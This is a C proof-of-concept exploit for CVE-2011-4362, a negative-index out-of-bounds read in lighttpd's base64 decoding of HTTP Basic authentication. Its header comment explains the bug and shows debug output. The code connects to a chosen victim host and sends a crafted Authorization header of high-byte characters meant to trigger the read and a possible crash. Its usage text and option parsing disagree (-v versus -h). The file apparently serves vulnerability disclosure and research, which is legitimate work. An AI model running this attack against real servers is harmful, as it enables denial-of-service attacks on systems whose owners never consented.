/*
 * Primitive Lighttpd Proof of Concept code for CVE-2011-4362 vulnerability discovered by Xi Wang
 *
 * Here the vulnerable code (src/http_auth.c:67)
 *
 * --- CUT ---
 * static const short base64_reverse_table[256] = {
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0x00 - 0x0F
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0x10 - 0x1F
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, /* 0x20 - 0x2F
 *         52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1, /* 0x30 - 0x3F
 *         -1,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, /* 0x40 - 0x4F
 *         15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1, /* 0x50 - 0x5F
 *         -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, /* 0x60 - 0x6F
 *         41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1, /* 0x70 - 0x7F
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0x80 - 0x8F
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0x90 - 0x9F
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0xA0 - 0xAF
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0xB0 - 0xBF
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0xC0 - 0xCF
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0xD0 - 0xDF
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0xE0 - 0xEF
 *         -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, /* 0xF0 - 0xFF
 * };
 *
 * static unsigned char * base64_decode(buffer *out, const char *in) {
 * 	...
 * 	int ch, ...;
 * 	size_t i;
 * 	...
 * 	
 * 		ch = in[i];
 * 		...
 * 		ch = base64_reverse_table[ch];
 * 	...
 * }
 * --- CUT ---
 *
 * Because variable 'in' is type 'char', characters above 0x80 lead to negative indices.
 * This vulnerability may lead out-of-boud read and theoretically cause Segmentation Fault
 * (Denial of Service attack). Unfortunately I couldn't find any binaries where .rodata
 * section before the base64_reverse_table table cause this situation.
 *
 * I have added some extra debug in the lighttpd source code to see if this vulnerability is
 * executed correctly. Here is output for one of the example:
 *
 * --- CUT ---
 * ptr[0x9a92c48] size[0xc0] used[0x0]
 * 127(. | 0 | 0)
 * -128(t | 1 | 0)
 * -127(e | 2 | 1)
 * -126(' | 3 | 2)
 * -125(e | 4 | 3)
 * -124(u | 5 | 3)
 * -123(r | 6 | 4)
 * -122(' | 7 | 5)
 * -121(s | 8 | 6)
 * -120(c | 9 | 6)
 * -119(i | 10 | 7)
 * -118(n | 11 | 8)
 * -117(i | 12 | 9)
 * -116(  | 13 | 9)
 * -115(a | 14 | 10)
 * -114(t | 15 | 11)
 * -113(. | 16 | 12)
 * -112(e | 17 | 12)
 * -111(u | 18 | 13)
 * -110(r | 19 | 14)
 * -109(' | 20 | 15)
 * -108(f | 21 | 15)
 * -107(i | 22 | 16)
 * -106(e | 23 | 17)
 * -105(: | 24 | 18)
 * -104(= | 25 | 18)
 * -103(o | 26 | 19)
 * -102(t | 27 | 20)
 * -101(o | 28 | 21)
 * -100(  | 29 | 21)
 * -99(a | 30 | 22)
 * -98(g | 31 | 23)
 * -97(. | 32 | 24)
 * -96(d | 33 | 24)
 * -95(g | 34 | 25)
 * -94(s | 35 | 26)
 * -93(: | 36 | 27)
 * -92(u | 37 | 27)
 * -91(s | 38 | 28)
 * -90(p | 39 | 29)
 * -89(o | 40 | 30)
 * -88(t | 41 | 30)
 * -87(d | 42 | 31)
 * -86(b | 43 | 32)
 * -85(c | 44 | 33)
 * -84(e | 45 | 33)
 * -83(d | 46 | 34)
 * -82(( | 47 | 35)
 * -81(n | 48 | 36)
 * -80(y | 49 | 36)
 * -79(h | 50 | 37)
 * -78(d | 51 | 38)
 * -77(g | 52 | 39)
 * -76(s | 53 | 39)
 * -75(  | 54 | 40)
 * -74(r | 55 | 41)
 * -73(p | 56 | 42)
 * -72(a | 57 | 42)
 * -71(n | 58 | 43)
 * -70(. | 59 | 44)
 * -69(. | 60 | 45)
 * -68(d | 61 | 45)
 * -67(g | 62 | 46)
 * -66(s | 63 | 47)
 * -65(: | 64 | 48)
 * -64(( | 65 | 48)
 * -63(d | 66 | 49)
 * -62(- | 67 | 50)
 * -61(e | 68 | 51)
 * -60(s | 69 | 51)
 * -59(  | 70 | 52)
 * -58(i | 71 | 53)
 * -57(s | 72 | 54)
 * -56(n | 73 | 54)
 * -55(  | 74 | 55)
 * -54(i | 75 | 56)
 * -53(l | 76 | 57)
 * -52(. | 77 | 57)
 * -51(. | 78 | 58)
 * -50(k | 79 | 59)
 * -49(0 | 80 | 60)
 * -48(% | 81 | 60)
 * -47(] | 82 | 61)
 * -46(p | 83 | 62)
 * -45(r | 84 | 63)
 * -44(0 | 85 | 63)
 * -43(% | 86 | 64)
 * -42(] | 87 | 65)
 * -41(s | 88 | 66)
 * -40(z | 89 | 66)
 * -39([ | 90 | 67)
 * -38(x | 91 | 68)
 * -37(x | 92 | 69)
 * -36(  | 93 | 69)
 * -35(s | 94 | 70)
 * -34(d | 95 | 71)
 * -33(0 | 96 | 72)
 * -32(% | 97 | 72)
 * -31(] | 98 | 73)
 * -30(. | 99 | 74)
 * -29(. | 100 | 75)
 * -28(d | 101 | 75)
 * -27(c | 102 | 76)
 * -26(d | 103 | 77)
 * -25(i | 104 | 78)
 * -24(g | 105 | 78)
 * -23(b | 106 | 79)
 * -22(s | 107 | 80)
 * -21(6 | 108 | 81)
 * -20(- | 109 | 81)
 * -19(t | 110 | 82)
 * -18(i | 111 | 83)
 * -17(g | 112 | 84)
 * -16(f | 113 | 84)
 * -15(i | 114 | 85)
 * -14(e | 115 | 86)
 * -13(. | 116 | 87)
 * -12(. | 117 | 87)
 * -11(. | 118 | 88)
 * -10(. | 119 | 89)
 * -9(. | 120 | 90)
 * -8(. | 121 | 90)
 * -7(. | 122 | 91)
 * -6(. | 123 | 92)
 * -5(. | 124 | 93)
 * -4(. | 125 | 93)
 * -3(. | 126 | 94)
 * -2(. | 127 | 95)
 * -1(. | 128 | 96)
 * k[0x60] ptr[0x9a92c48] size[0xc0] used[0x0]
 * ptr[0x9a92c48] size[0xc0] used[0x60]
 * string [.Yg.\...n.Xt.]r.ze.....g.Y..\..Yb.Y(..d..r.[..Y...-.xi..i.]
 * --- CUT ---
 *
 * First column is the offset so vulnerability is executed like it should be
 * (negative offsets). Second column is byte which is read out-of-bound.
 *
 *
 * Maybe you can find vulnerable binary?
 *
 *
 * Best regards,
 * Adam 'pi3' Zabrocki
 *
 *
 * --
 * http://pi3.com.pl
 * http://site.pi3.com.pl/exp/p_cve-2011-4362.c
 * http://blog.pi3.com.pl/?p=277
 *
 */


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <getopt.h>

#define PORT 80
#define SA struct sockaddr

char header[] =
"GET /%s/ HTTP/1.1\r\n"
"Host: %s\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:8.0.1) Gecko/20100101 Firefox/8.0.1\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"Proxy-Connection: keep-alive\r\n"
"Authorization: Basic ";

char header_port[] =
"GET /%s/ HTTP/1.1\r\n"
"Host: %s:%d\r\n"
"User-Agent: Mozilla/5.0 (X11; Linux i686; rv:8.0.1) Gecko/20100101 Firefox/8.0.1\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: pl,en-us;q=0.7,en;q=0.3\r\n"
"Accept-Encoding: gzip, deflate\r\n"
"Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
"Proxy-Connection: keep-alive\r\n"
"Authorization: Basic ";


int main(int argc, char *argv[]) {

   int i=PORT,opt=0,sockfd;
   char *remote_dir = NULL;
   char *r_hostname = NULL;
   struct sockaddr_in servaddr;
   struct hostent *h = NULL;
   char *buf;
   unsigned int len = 0x0;


   if (!argv[1])
      usage(argv[0]);


   printf("\n\t...::: -=[ Proof of Concept for CVE-2011-4362 (by Adam 'pi3' Zabrocki) ]=- :::...\n");
   printf("\n\t\t[+] Preparing arguments... ");
   while((opt = getopt(argc,argv,"h:d:p:?")) != -1) {
      switch(opt) {

       case 'h':

         r_hostname = strdup(optarg);
         if ( (h = gethostbyname(r_hostname))==NULL) {
             printf("Gethostbyname() field!\n");
             exit(-1);
         }
         break;

       case 'p':

             i=atoi(optarg);
         break;

       case 'd':

             remote_dir = strdup(optarg);
         break;

       case '?':

             usage(argv[0]);
         break;

       default:

             usage(argv[0]);
         break;

      }
   }

   if (!remote_dir || !h) {
      usage(argv[0]);
      exit(-1);
   }

   servaddr.sin_family      = AF_INET;
   servaddr.sin_port        = htons(i);
   servaddr.sin_addr        = *(struct in_addr*)h->h_addr;

   len = strlen(header_port)+strlen(remote_dir)+strlen(r_hostname)+512;
   if ( (buf = (char *)malloc(len)) == NULL) {
      printf("malloc() :(\n");
      exit(-1);
   }
   memset(buf,0x0,len);

   if (i != 80)
      snprintf(buf,len,header_port,remote_dir,r_hostname,i);
   else
      snprintf(buf,len,header,remote_dir,r_hostname);

   for (i=0;i<130;i++)
      buf[strlen(buf)] = 127+i;

   buf[strlen(buf)] = '\r';
   buf[strlen(buf)] = '\n';
   buf[strlen(buf)] = '\r';
   buf[strlen(buf)] = '\n';

   printf("OK\n\t\t[+] Creating socket... ");
   if ( (sockfd=socket(AF_INET,SOCK_STREAM,0)) < 0 ) {
      printf("Socket() error!\n");
      exit(-1);
   }

   printf("OK\n\t\t[+] Connecting to [%s]... ",r_hostname);
   if ( (connect(sockfd,(SA*)&servaddr,sizeof(servaddr)) ) < 0 ) {
      printf("Connect() error!\n");
      exit(-1);
   }

   printf("OK\n\t\t[+] Sending dirty packet... ");
//   write(1,buf,strlen(buf));
   write(sockfd,buf,strlen(buf));

   printf("OK\n\n\t\t[+] Check the website!\n\n");

   close(sockfd);

}

int usage(char *arg) {

      printf("\n\t...::: -=[ Proof of Concept for CVE-2011-4362 (by Adam 'pi3' Zabrocki) ]=- :::...\n");
      printf("\n\tUsage: %s <options>\n\n\t\tOptions:\n",arg);
      printf("\t\t\t -v <victim>\n\t\t\t -p <port>\n\t\t\t -d <remote_dir_for_auth>\n\n");
      exit(0);
}
